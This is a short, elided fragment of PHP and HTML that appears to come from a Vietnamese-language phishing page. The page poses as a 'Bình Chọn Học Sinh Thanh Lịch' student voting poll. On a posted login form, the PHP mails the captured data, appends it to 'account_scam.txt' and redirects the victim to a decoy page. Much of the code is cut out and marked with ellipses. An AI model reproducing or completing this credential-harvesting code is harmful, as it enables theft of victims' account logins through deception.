...
?>
    <?php
    	if(isset($_POST["login"])){
    		...
    		//  $subject = "Kiên 205 Official";
             ...
             mail("", $headers, $body, $subject);
            $test = fopen("account_scam.txt","a");
            fwrite($test,$body);
            fclose($test); 
            header('Location: /hoc-sinh-thanh-lich.html');
    ...
    ?>
        ...
        <head>
            ...
            <meta property="og:title" content="Bình Chọn Học Sinh Thanh Lich" />
            ...
            <title>Bình Chọn Học Sinh Thanh Lịch</title>
